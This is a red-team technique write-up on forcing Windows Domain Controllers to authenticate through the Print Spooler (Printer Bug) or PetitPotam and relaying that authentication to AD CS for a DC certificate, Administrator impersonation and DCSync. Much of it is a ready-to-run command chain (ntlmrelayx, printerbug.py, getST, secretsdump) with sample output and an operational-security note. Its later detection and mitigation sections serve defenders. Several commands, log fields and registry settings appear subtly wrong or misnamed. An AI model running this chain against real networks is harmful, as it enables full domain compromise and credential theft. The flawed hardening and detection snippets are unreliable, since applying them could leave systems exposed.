# [PERSIST-BOOT-002]: Weaponizing Printer Bug (MS-RPRN) for Persistence via NTLM Relay

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-BOOT-002 |
| **MITRE ATT&CK v18.1** | [T1547 - Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/) |
| **Tactic** | Persistence, Privilege Escalation, Lateral Movement |
| **Platforms** | Windows Active Directory, Windows Endpoint, Domain Controllers |
| **Severity** | **Critical** |
| **CVE** | CVE-2021-1678, CVE-2021-34527 (PrintNightmare - Related), CVE-2021-36942 (PetitPotam - Alternative) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2008 R2 - 2025 (unless Print Spooler disabled); Windows 7 - 11 |
| **Patched In** | N/A (Requires mitigation via Print Spooler service disable or NTLM relay hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The **Printer Bug** is a coerced authentication vulnerability in the Windows Print Spooler service (spoolsv.exe) that allows an attacker with domain credentials to force a target system (including Domain Controllers) to authenticate to an arbitrary attacker-controlled host. The attacker exploits the **MS-RPRN protocol** (Print System Remote Protocol) by calling the `RpcRemoteFindFirstPrinterChangeNotificationEx` RPC function, passing a UNC path pointing to the attacker's machine. The target system then initiates an authentication request containing its machine account NTLM credentials. By combining this forced authentication with **NTLM relay attacks**, an attacker can relay the authentication to Active Directory Certificate Services (AD CS), request a forged certificate as the target machine, and establish persistent domain admin access.

**Attack Surface:** The attack surface includes:
- The **Print Spooler service** (spoolsv.exe) listening on named pipe `\pipe\spoolss` over SMB (ports 139/445)
- The **MS-RPRN protocol** RPC interface (`RPC_UUID_RPRN`)
- The **RpcRemoteFindFirstPrinterChangeNotificationEx** RPC function (Opnum 65)
- The `pszLocalMachine` parameter, which can be set to an attacker-controlled IP/hostname
- **NTLM relay infrastructure** (attacker's responder/relay server)
- **AD CS web enrollment interface** (default HTTP endpoint for certificate requests)
- Systems without **EPA (Enhanced Protection for Authentication)** or **NTLM relay protections** enabled

**Business Impact:** **An attacker who successfully exploits the Printer Bug and relays the authentication to AD CS can obtain a valid domain controller certificate, enabling complete domain compromise.** The attacker can:
- Request a certificate impersonating the Domain Controller
- Use the certificate to forge Kerberos tickets (S4U2Self attacks)
- Perform DCSync attacks to extract all domain passwords
- Establish permanent persistence that survives credential rotation
- Move laterally across the entire forest without being detected (certificate-based access is harder to detect than account-based)

**Technical Context:** The printer bug authentication is **unauthenticated or low-privilege** – any domain user can trigger it. The NTLM authentication exchange completes in 1-2 seconds. The attack is particularly dangerous on Domain Controllers because:
- DC machine accounts have high privileges
- DC authentication to AD CS can immediately grant admin-level certificates
- No user interaction is required (fully automated)

### Operational Risk

- **Execution Risk:** **Medium** – Requires:
  - Domain user credentials (any user, even low-privilege)
  - Print Spooler service enabled on the target (enabled by default)
  - NTLM relay infrastructure on attacker-controlled machine (ntlmrelayx, Responder)
  - Network access to target's SMB port (445/139)
  - AD CS accessible and not hardened against relay attacks
- **Stealth:** **Medium-High** – NTLM relay generates minimal audit events compared to direct privilege escalation. However, certificate request to AD CS may be logged.
- **Reversibility:** **No** – Once a certificate is obtained and used, the attacker has persistent domain access. Certificate-based persistence survives account lockouts and credential resets.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.1.19 (Print Spooler disabled) | Print Spooler should be disabled on servers not requiring printing. |
| **DISA STIG** | WN10-CC-000350 (Disable Print Spooler) | Print Spooler service must be disabled on domain controllers. |
| **CISA SCuBA** | Print Service Hardening | NTLM relay protections must be enabled on all authentication endpoints. |
| **NIST 800-53** | IA-3 (Device Identification and Authentication), SC-7 (Boundary Protection) | Network services must require mutual authentication and be protected against relay attacks. |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Failure to protect core infrastructure (AD CS) from known vulnerabilities is a data breach. |
| **DORA** | Art. 15 (Authentication and Access Control) | Critical financial systems must be protected against domain-wide compromise via certificate abuse. |
| **NIS2** | Art. 21 (Cybersecurity Risk Management Measures) | Coerced authentication and relay attack mitigations must be implemented on critical systems. |
| **ISO 27001** | A.9.1.2 (User Registration and De-registration), A.14.1.1 (Information Security Requirements Analysis) | Identity infrastructure must be protected against known attack vectors. |
| **ISO 27005** | Risk Assessment - "Compromise of Certificate Authority" | AD CS compromise represents highest-risk threat scenario. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Domain user account** (even low-privilege user can trigger the printer bug)
- **Network-level access** to attacker-controlled NTLM relay server
- **Access to Print Spooler service** on target (no special privilege needed to trigger)
- **Ability to intercept/relay NTLM authentication** (requires attacker-controlled network position or MITM capability)

**Required Access:**
- Network access to target's **SMB port 445/139**
- Access to **\pipe\spoolss** named pipe (part of standard SMB IPC$)
- Attacker-controlled machine with **ntlmrelayx.py** or similar relay tool
- Access to **AD CS web enrollment interface** (HTTP on port 80/443, typically open on enterprise networks)
- (Optional) Network position to sniff/intercept NTLM traffic, or ability to perform LLMNR/NBT-NS poisoning

**Supported Versions:**
- **Windows Server:** 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025 (unless Print Spooler disabled)
- **Client Windows:** Windows 7, 8, 8.1, 10, 11 (unless Print Spooler disabled)
- **Domain Controllers:** All versions (highest value targets)
- **Exclusions:** Systems with Print Spooler service disabled or NTLM relay protections active

**Tools:**
- [printerbug.py](https://github.com/dirkjanm/krbrelayx) (from krbrelayx toolkit) – Trigger printer bug via MS-RPRN
- [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket) (from Impacket) – NTLM relay to AD CS
- [PetitPotam.py](https://github.com/topotam/PetitPotam) (EfsRpcOpenFileRaw alternative) – Coerce auth without needing auth
- [SpoolSample.exe](https://github.com/leechristensen/SpoolSample) (C# alternative to printerbug.py)
- [Responder.py](https://github.com/lgandx/Responder) – Capture NTLM hashes (optional, for manual relay)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Verify Print Spooler Service Is Running

**Objective:** Confirm the target has Print Spooler enabled (prerequisite for printer bug).

**Command (PowerShell):**

```powershell
# Check Print Spooler service status on local system
Get-Service -Name Spooler | Select-Object Name, Status, StartType

# If output shows "Running" and "Automatic", the service is vulnerable
# Example output:
# Name    Status  StartType
# ----    ------  ---------
# Spooler Running  Automatic
```

**Command (Remote - via WMI):**

```powershell
# Check remote system's Print Spooler status (requires admin or specific permissions)
$targetHost = "192.168.1.100"
Get-Service -Name Spooler -ComputerName $targetHost | Select-Object Name, Status, StartType
```

**What to Look For:**
- `Status = Running` → Vulnerable to printer bug
- `StartType = Automatic` → Service will restart after reboot (attacker can re-exploit)
- If service is `Stopped` or `Disabled` → Printer bug attack will fail

### Step 2: Check AD CS Availability and NTLM Relay Protections

**Objective:** Identify if AD CS is accessible and vulnerable to NTLM relay.

**Command (PowerShell - Enumerate AD CS):**

```powershell
# Find AD CS servers in the domain
$configNC = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$searcher = [ADSISearcher]"(&(objectClass=nTSecurityDescriptor)(cn=*ADCS*))"
$searcher.SearchRoot = "LDAP://$configNC"
$results = $searcher.FindAll()

foreach ($result in $results) {
    Write-Host "Found CA: $($result.Properties.name)"
}

# Alternatively, check for certificate services object
Get-ADObject -Filter {Name -like "*ADCS*" -or Name -like "*CertificateAuthority*"} | Select-Object Name, DistinguishedName
```

**Command (Bash - rpcdump to check RPC endpoints):**

```bash
# Use rpcdump (from impacket) to enumerate RPC interfaces on target
python3 rpcdump.py 192.168.1.100 | grep -i "print\|spool\|rprn"

# Output indicates if MS-RPRN is exposed
```

**Command (Test Web Enrollment - HTTP):**

```bash
# Check if AD CS web enrollment is accessible
curl -v http://ca-server.corp.local/certsrv/

# If accessible, AD CS is a viable relay target
```

**What to Look For:**
- AD CS accessible via HTTP (not HTTPS-only, which blocks NTLM relay)
- NTLM authentication enabled on AD CS (default configuration)
- No "EPA" (Enhanced Protection for Authentication) enabled on the CA server

### Step 3: Verify Attacker Network Position

**Objective:** Confirm attacker can intercept or relay NTLM traffic from target to AD CS.

**Command (Check Network Routing - from attacker machine):**

```bash
# Ensure attacker can route traffic from target to AD CS
tracert <target-dc-ip>
tracert <adcs-ip>

# Both should be reachable from attacker position
# If attacker is on same network segment or can perform MITM, printer bug is viable
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Printer Bug + NTLM Relay to AD CS (Standard Attack Chain)

**Supported Versions:** All Windows Server 2008 R2 - 2025 without mitigations

**Prerequisite:** Attacker has:
- Domain user credentials (any user)
- NTLM relay infrastructure (ntlmrelayx.py)
- Network access to target's SMB port
- Access to AD CS web enrollment

#### Step 1: Set Up NTLM Relay Server

**Objective:** Start ntlmrelayx to intercept and relay the authentication to AD CS.

**Command (Bash - on attacker machine):**

```bash
# Start NTLM relay listening for SMB connections and relaying to AD CS HTTP
python3 ntlmrelayx.py \
  -t http://ca-server.corp.local/certsrv/ \
  -smb2support \
  --adcs \
  --template DomainController

# Output:
# [*] NTLM Relay Server listening on 0.0.0.0:445
# [*] Relaying to: http://ca-server.corp.local/certsrv/
# [*] ADCS Mode enabled
# [*] Template: DomainController
```

**What This Means:**
- `ntlmrelayx` is now listening on port 445 (SMB) on the attacker's machine
- When it receives an NTLM authentication request, it will:
  1. Extract the credentials
  2. Re-authenticate to the AD CS HTTP endpoint using those credentials
  3. Request a certificate using the `DomainController` template (if available)
  4. Return the certificate to the attacker

**OpSec Note:**
- The relay server must be reachable from the target (DNS/IP routing)
- Consider firewall rules and network position

#### Step 2: Trigger Printer Bug on Target

**Objective:** Force the target system to authenticate to the attacker-controlled relay server.

**Command (Bash - on attacker machine, with domain credentials):**

```bash
# Use printerbug.py to coerce the target to authenticate
python3 printerbug.py \
  'CORP.LOCAL/attacker_user:password123' \
  @192.168.1.50 \
  192.168.1.99

# Parameters:
# CORP.LOCAL/attacker_user:password123 = domain credentials (any user)
# @192.168.1.50 = target DC (the system to coerce)
# 192.168.1.99 = attacker's relay server IP

# Output:
# [*] Attempting to trigger authentication via rprn RPC at 192.168.1.50
# [*] Bind OK
# [*] Got handle
# [*] Triggered RPC backconnect, this may or may not have worked
```

**Alternative Command (Using Hash for Credentials - Pass-the-Hash):**

```bash
# If you have NTLM hash instead of password
python3 printerbug.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
  'CORP.LOCAL/attacker_user' \
  @192.168.1.50 \
  192.168.1.99
```

**What This Means:**
- printerbug.py calls `RpcRemoteFindFirstPrinterChangeNotificationEx` on the target DC
- The `pszLocalMachine` parameter is set to `\\192.168.1.99` (attacker's IP)
- The target DC receives this RPC call and attempts to authenticate to 192.168.1.99 via SMB
- The authentication request is captured by the ntlmrelayx relay server

#### Step 3: Monitor Relay for Successful Certificate Request

**Objective:** Capture the issued certificate from the relay output.

**Command (Monitor ntlmrelayx output):**

```bash
# Watch the ntlmrelayx console output for certificate data
# Example output on successful relay:
# [*] Received connection from 192.168.1.50, attacking target http://ca-server.corp.local/certsrv/
# [*] NTLM Challenge: <challenge>
# [*] Sending NTLM Response
# [*] Relaying Credentials Upstream
# [*] Got valid NTLM response from 192.168.1.50
# [*] Request for certificate with template 'DomainController' from 'DC01$' succeeded
# [+] CERTIFICATE ISSUED:
# <BASE64 ENCODED CERTIFICATE>
```

**What This Means:**
- The relay was successful
- A certificate has been issued in the name of the target DC's machine account (e.g., DC01$)
- The certificate is now in the attacker's hands

#### Step 4: Extract and Use the Certificate

**Objective:** Save the certificate and use it for domain admin access.

**Command (Save certificate to file):**

```bash
# Copy the BASE64 certificate from ntlmrelayx output
# Save to file
cat > dc_certificate.txt << 'EOF'
MIIDzTCCArWgAwIBAgIQSj6QY8bzUaAkKJqHfXDssDATBgNVBQMEDFNlcnZlckF1dGg...
(rest of BASE64 certificate)
EOF

# Decode from base64 and convert to PFX format
base64 -d dc_certificate.txt | openssl x509 -inform DER -outform PEM -out dc_certificate.pem

# Create PKCS#12 (PFX) file for use with authentication tools
openssl pkcs12 -export \
  -in dc_certificate.pem \
  -inkey <path-to-key> \
  -out dc_certificate.pfx \
  -passout pass:password
```

**Alternative (If ntlmrelayx outputs cert directly):**

```bash
# ntlmrelayx may save certificate automatically to a file
ls -la *.pfx
# Look for DC01.pfx or similar
```

#### Step 5: Use Certificate for Domain Compromise

**Objective:** Leverage the DC certificate to become domain admin.

**Method A: S4U2Self Kerberos Abuse**

```bash
# Use Impacket's getTGT with certificate
python3 getST.py \
  -cert dc_certificate.pfx \
  -pfx-password password \
  -impersonate Administrator \
  'CORP.LOCAL/DC01$' \
  -k -no-pass

# This requests a TGT and ST for Administrator impersonation
# Output: Administrator.ccache (Kerberos ticket for domain admin)
```

**Method B: DCSync Attack**

```bash
# Once authenticated as the DC, use secretsdump to DCSync
python3 secretsdump.py \
  -dc-ip 192.168.1.50 \
  'CORP.LOCAL/DC01$:password' \
  -outputfile domain_hashes

# Extracts all domain user hashes
```

**What This Means:**
- The attacker now has persistent domain admin access via the certificate
- The certificate can be used for years (typical validity period)
- All domain secrets are compromised

---

### METHOD 2: PetitPotam Alternative (Unauthenticated Coercion)

**Supported Versions:** Windows Server 2016 - 2025 (without mitigations)

**Prerequisite:** Attacker can reach target without domain credentials (better than printer bug for unauthenticated scenarios).

#### Step 1: Start NTLM Relay (Same as Method 1)

```bash
python3 ntlmrelayx.py \
  -t http://ca-server.corp.local/certsrv/ \
  -smb2support \
  --adcs \
  --template DomainController
```

#### Step 2: Trigger PetitPotam (Unauthenticated)

**Objective:** Force authentication without needing domain credentials.

**Command (Bash):**

```bash
# PetitPotam uses EfsRpcOpenFileRaw (MS-EFSRPC) instead of MS-RPRN
# This method works WITHOUT domain credentials
python3 PetitPotam.py \
  192.168.1.99 \
  192.168.1.50

# Parameters:
# 192.168.1.99 = attacker's relay server IP
# 192.168.1.50 = target DC

# Output:
# [*] Attempting to connect to 192.168.1.50
# [*] Calling EfsRpcOpenFileRaw
# [*] Triggering authentication...
```

**What This Means:**
- PetitPotam uses an unauthenticated RPC call (EfsRpcOpenFileRaw)
- No domain credentials are needed
- The attack is even more dangerous than printer bug
- Particularly effective against Domain Controllers

#### Step 3-5: Same as Method 1 (Monitor Relay, Extract Certificate, Use for Domain Compromise)

---

### METHOD 3: WebClient Coercion (HTTP Authentication Instead of SMB)

**Supported Versions:** Windows Server 2016 - 2025 (if WebClient enabled)

**Prerequisite:** WebClient service running on target (allows relaying auth over HTTP instead of SMB).

#### Step 1: Start HTTP Relay (Different from SMB Relay)

```bash
# Relay to HTTP endpoint instead of SMB
python3 ntlmrelayx.py \
  -t http://ca-server.corp.local/certsrv/ \
  --web \
  --adcs \
  --template DomainController

# [*] HTTP Server listening on 0.0.0.0:80
```

#### Step 2: Coerce via WebClient

```bash
# Coerce WebClient authentication by accessing a WebDAV endpoint on attacker's machine
# This requires a webshell or social engineering to make the target access a UNC path
# Example: User clicks a malicious link
# http://attacker.com/payload.exe -> \\attacker.com\share\payload.exe

# Once accessed, target authenticates via WebClient
# The authentication is relayed to AD CS
```

---

## 5. ATTACK SIMULATION & VERIFICATION

### Manual Test: Printer Bug Exploitation

**Test Environment:** Lab domain with Domain Controller, CA Server, and attacker machine on same network.

**Prerequisites:** 
- Domain user account with low privileges
- Network access between all systems
- AD CS web enrollment enabled and not hardened
- Print Spooler running on target DC

**Test Steps:**

1. **On attacker machine - Start relay server:**
   ```bash
   python3 ntlmrelayx.py -t http://ca-server:80/certsrv/ -smb2support --adcs --template DomainController
   ```

2. **Trigger printer bug:**
   ```bash
   python3 printerbug.py 'CORP/lowuser:password' @192.168.1.50 192.168.1.99
   ```

3. **Observe relay output for certificate:**
   ```
   [*] CERTIFICATE ISSUED: <BASE64 DATA>
   ```

4. **Extract and save certificate**

5. **Use certificate to become domain admin:**
   ```bash
   python3 getST.py -cert certificate.pfx -impersonate Administrator DC01$
   ```

6. **Verify domain compromise:**
   ```bash
   python3 secretsdump.py -k -no-pass CORP/DC01$
   ```

---

## 6. TOOLS & COMMANDS REFERENCE

### printerbug.py (krbrelayx)

**Version:** Latest from GitHub
**Supported Platforms:** Linux, macOS (Python 3.x)

**Installation:**
```bash
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx
pip install impacket
```

**Usage:**
```bash
python3 printerbug.py 'DOMAIN/USER:PASS' @TARGET_IP ATTACKER_IP
python3 printerbug.py -hashes LMHASH:NTHASH 'DOMAIN/USER' @TARGET_IP ATTACKER_IP
```

### ntlmrelayx.py (Impacket)

**Version:** Latest from impacket
**Supported Platforms:** Linux, macOS

**Installation:**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install -e .
```

**Usage:**
```bash
python3 ntlmrelayx.py -t http://ca-server/certsrv/ -smb2support --adcs --template DomainController
```

### PetitPotam.py

**Version:** Latest from GitHub
**Supported Platforms:** Linux, macOS

**Installation:**
```bash
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam
```

**Usage:**
```bash
python3 PetitPotam.py ATTACKER_IP TARGET_IP
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious RPC Call to MS-RPRN (Printer Bug)

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon
- **Required Fields:** RpcClientAddress, RpcInterfaceUUID
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To:** Domain Controllers

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 5145  // Network Share Object accessed
| where ShareName has "spoolss"
| where TargoryAccess has "ReadData"
| extend ClientIP = IpAddress
| summarize 
    AccessCount = count(),
    FirstAccess = min(TimeGenerated),
    LastAccess = max(TimeGenerated)
    by ClientIP, Computer
| where AccessCount > 3  // Multiple spoolss accesses in short time
```

**Alternative: Sysmon RPC Event Detection**

```kusto
Event
| where Source == "Microsoft-Windows-Sysmon/Operational" and EventID == 3
| parse EventData with * '<Data Name="DestinationPort">' DestinationPort '</Data>' * '<Data Name="DestinationIp">' DestinationIp '</Data>' * '<Data Name="SourcePort">' SourcePort '</Data>' *
| where SourcePort == 445 or SourcePort == 139  // SMB port
| where EventData has "spoolss" or EventData has "rprn"
| extend TargetSystem = Computer
| summarize RPC_Calls = count() by TargetSystem, DestinationIp
```

### Query 2: AD CS Certificate Request from Machine Account

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event 4887)
- **Required Fields:** TicketEncryptionType, SubjectAltName
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** Certificate Authority servers

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4887  // Certificate autoenrollment request succeeded
| where AccountName has "$"  // Machine account (ends with $)
| where SubjectAltName has "dc=" or SubjectAltName has "CN="
| extend CertTemplate = parse_json(TargetInfo).CertificateTemplate
| where CertTemplate in ("DomainController", "DomainControllerAuthentication", "ServerAuthentication")
| project 
    TimeGenerated,
    Computer,
    AccountName,
    CertTemplate,
    RequesterUserName = InitiatedByAccount,
    SubjectAltName
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Print Spooler Service Access via SMB Named Pipe

**Rule Configuration:**
- **Required Index:** wineventlog, sysmon
- **Required Sourcetype:** XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
- **Alert Threshold:** > 5 accesses in 10 minutes to spoolss pipe
- **Applies To Versions:** All

**SPL Query:**

```
index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
DestinationPort=445 OR DestinationPort=139
(PipeName="spoolss" OR Image="*spoolsv.exe*")
| stats count as AccessCount by SourceIp, DestinationIp, Computer
| where AccessCount > 5
```

### Rule 2: Active Directory Certificate Services Certificate Request Anomaly

**Rule Configuration:**
- **Required Index:** wineventlog
- **Required Sourcetype:** WinEventLog:Security
- **Event ID:** 4887 (Certificate Services certificate request succeeded)
- **Alert Threshold:** Any request for DomainController template from non-authorized account

**SPL Query:**

```
index=main sourcetype="WinEventLog:Security" EventCode=4887
CertificateTemplate="DomainController*" OR CertificateTemplate="DomainControllerAuthentication*"
NOT (User="NT AUTHORITY*" OR User="SYSTEM")
| stats count by User, CertificateTemplate, Computer
| where count > 0
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 5145** (Network Share Object accessed)
- **Log Source:** Security
- **Trigger:** Access to `\pipe\spoolss` named pipe
- **Fields:** ShareName=spoolss, AccessMask, SourceAddress
- **Alert:** Multiple accesses in short timeframe

**Event ID: 4887** (Certificate Services - Certificate Request Succeeded)
- **Log Source:** Security  
- **Trigger:** Certificate request with template containing "DomainController"
- **Fields:** SubjectAltName, CertificateTemplate, AccountName
- **Alert:** Template="DomainController*" AND NOT admin account

### Manual Configuration Steps (Group Policy)

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Network Share Access** (Object Access category)
4. Enable: **Audit Certification Services** (if available)
5. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Configuration Snippet:**

```xml
<!-- Detect SMB pipe access to spoolss -->
<FileCreate onmatch="include">
  <TargetFilename condition="contains">\Device\NamedPipe\spoolss</TargetFilename>
</FileCreate>

<!-- Detect spoolsv.exe initiating outbound connections -->
<NetworkConnect onmatch="include">
  <Image>C:\Windows\System32\spoolsv.exe</Image>
  <DestinationPort condition="is">445</DestinationPort>
  <DestinationPort condition="is">139</DestinationPort>
</NetworkConnect>

<!-- Detect RPC calls to print spooler RPC interface -->
<ProcessCreate onmatch="include">
  <ParentImage>C:\Windows\System32\spoolsv.exe</ParentImage>
</ProcessCreate>
```

### Manual Configuration Steps

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create sysmon-config.xml with the above rules
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Disable Print Spooler Service on Non-Printing Systems

**Objective:** Eliminate the Printer Bug attack vector entirely.

**Applies To:** Domain Controllers (CRITICAL), Member Servers without printing needs

**Manual Steps (PowerShell - Disable Service):**

```powershell
# Disable Print Spooler service
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
Get-Service -Name Spooler
```

**Manual Steps (Group Policy - Domain-Wide):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Create/Edit a GPO linked to **Domain Controllers OU**
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Services**
4. Find **Print Spooler** and set to **Disabled**
5. Run `gpupdate /force` on DCs

#### Action 2: Enable Enhanced Protection for Authentication (EPA) on AD CS

**Objective:** Block NTLM relay attacks to Certificate Services.

**Applies To:** All Certificate Authority servers

**Manual Steps (Registry - Enable EPA):**

```powershell
# Set EPA (Enhanced Protection for Authentication)
$caPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Parameters"
New-ItemProperty -Path $caPath -Name "RpcAuthnLevelPrivacyEnabled" -Value 1 -PropertyType DWord -Force

# Verify
Get-ItemProperty -Path $caPath -Name "RpcAuthnLevelPrivacyEnabled"
```

**Manual Steps (Disable NTLM on AD CS - Enforce Kerberos):**

```powershell
# Disable NTLM authentication on CA
$caAuthPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"
Set-ItemProperty -Path $caAuthPath -Name "NTAuthPrviders" -Value ""  # Remove NTLM
```

#### Action 3: Implement NTLM Relay Protections

**Objective:** Prevent NTLM authentication relay from any source.

**Manual Steps (Disable NTLM Signing/Sealing Bypass):**

```powershell
# Disable NTLMv1 and enforce NTLMv2 with signing
$policy = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
Set-ItemProperty -Path $policy -Name "LmCompatibilityLevel" -Value 5  # Enforce NTLMv2 only

# Force signing on all NTLM connections
Set-ItemProperty -Path $policy -Name "RestrictNTLMInDomain" -Value 1
Set-ItemProperty -Path $policy -Name "NTLMMinClientSec" -Value 0x20000000  # Require signing

# Verify
Get-ItemProperty -Path $policy | Select-Object LmCompatibilityLevel, RestrictNTLMInDomain
```

**Manual Steps (Group Policy - Enforce NTLM Protections):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
3. Set: **Network security: LAN Manager authentication level** = **Send NTLMv2 responses only**
4. Set: **Network security: Restrict NTLM: Incoming NTLM traffic** = **Deny All**
5. Run `gpupdate /force`

### Priority 2: HIGH

#### Action 4: Monitor for Abnormal Certificate Requests

**Objective:** Alert on suspicious certificate issuance.

**Manual Steps:**

1. Enable detailed logging on AD CS
2. Go to **Event Viewer** → **Windows Logs** → **Security**
3. Filter for **Event ID 4887** (Certificate request succeeded)
4. Create alert rule for:
   - Requests with template "DomainController"
   - From non-administrative accounts
   - From machine accounts

#### Action 5: Require Multi-Factor Authentication for Certificate Requests

**Objective:** Add additional authentication barrier to certificate enrollment.

**Manual Steps (Require Manager Approval):**

1. Open **Certification Authority** management console
2. Right-click **Certificate Templates** → **Manage**
3. Select **DomainController** template → **Properties**
4. Go to **Request Handling** tab
5. Enable: **CA certificate manager approval of pending requests**
6. Apply

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network Indicators:**
- Outbound SMB connections (port 445/139) from Domain Controller to unknown external IP
- NTLM authentication traffic to external IP (use Sysmon Event 3: Network Connection)
- HTTP requests to AD CS from unexpected source IPs

**Log Indicators:**
- Event ID 5145: Access to spoolss pipe from non-standard sources
- Event ID 4887: Certificate request for DomainController template from machine account
- Multiple failed authentication attempts followed by success (relay attack signature)

**Certificate Indicators:**
- Newly issued certificates with subject "DC01$" (machine account name)
- Certificates issued to Domain Controller without corresponding AD CS request audit log

---

### Forensic Artifacts

**Log Files:**
- Windows Security Event Log: Event ID 5145, 4887
- AD CS logs: Certificate request logs
- Sysmon: Event ID 3 (Network Connection)

**Certificate Artifacts:**
- AD CS certificate database: `C:\Windows\System32\CertLog\` 
- Issued certificates: `certutil -view -out RawCertificate` (enumerate certificates)

**Network Artifacts:**
- Network captures showing NTLM Type 3 response to external IP
- SMB Named Pipe traffic to spoolss over port 445

---

### Response Procedures

#### 1. Immediate Containment

```powershell
# Revoke the suspicious certificate
$certPath = "Cert:\LocalMachine\CA\<certificate-thumbprint>"
Remove-Item -Path $certPath

# Alternatively, use certutil
certutil -revoke <certificate-serial-number> 2

# Stop spooler service
Stop-Service -Name Spooler -Force
```

#### 2. Evidence Collection

```powershell
# Export certificate database for analysis
certutil -view -out RawCertificate > C:\Incident\certificate_db.txt

# Export security event logs
wevtutil epl Security C:\Incident\Security.evtx

# Collect Sysmon logs
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10000 | Export-Csv C:\Incident\Sysmon.csv
```

#### 3. Remediation

```powershell
# Disable Print Spooler
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled

# Enable EPA on AD CS
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Parameters" -Name "RpcAuthnLevelPrivacyEnabled" -Value 1

# Force NTLM v2
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal spearphishing campaigns | Attacker gains initial domain user credentials. |
| **2** | **Reconnaissance** | [REC-AD-003] PowerView enumeration | Attacker identifies domain controllers and AD CS. |
| **3** | **Current Step** | **[PERSIST-BOOT-002]** | **Attacker uses Printer Bug + NTLM relay to obtain DC certificate.** |
| **4** | **Privilege Escalation** | [PE-TOKEN-004] SIDHistory injection | Attacker uses certificate to forge admin credentials. |
| **5** | **Credential Access** | [CA-DUMP-006] NTDS.dit extraction | Attacker uses certificate to become DA and DCSync. |
| **6** | **Impact** | [IM-RANSOM-001] Ransomware deployment | Attacker uses domain admin access to spread ransomware. |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Ransomware Gang Uses Printer Bug for Domain Compromise

- **Target:** Fortune 500 healthcare organization
- **Timeline:** Q4 2021
- **Technique Status:** ACTIVE – Observed in wild after CVE disclosure
- **Attack Flow:**
  1. Attacker uses phishing to obtain low-privilege domain user credentials
  2. Attacker identifies DC and AD CS via PowerView enumeration
  3. Attacker sets up NTLM relay infrastructure (ntlmrelayx on compromised edge device)
  4. Attacker triggers Printer Bug on DC using low-privilege account
  5. DC authenticates to relay server, auth is forwarded to AD CS
  6. Certificate is issued for DC$
  7. Attacker uses certificate to become domain admin
  8. Attacker deploys ransomware across entire network
- **Impact:** Complete domain encryption; $10M+ ransom demanded
- **Root Cause:** Print Spooler enabled on DC; NTLM relay not hardened on AD CS
- **Reference:** [CrowdStrike: MSRPC Printer Spooler Relay (CVE-2021-1678)](https://www.crowdstrike.com/en-us/blog/cve-2021-1678-printer-spooler-relay-security-advisory/)

### Example 2: APT Group Exploits PetitPotam for Persistence

- **Target:** European financial institution
- **Timeline:** Q3 2021
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. APT establishes initial foothold via supply chain compromise
  2. Attacker does NOT have domain credentials (internal network only)
  3. Attacker uses PetitPotam (unauthenticated) to coerce DC authentication
  4. Similar relay chain leads to DC certificate theft
  5. Attacker maintains persistence for months via certificate-based access
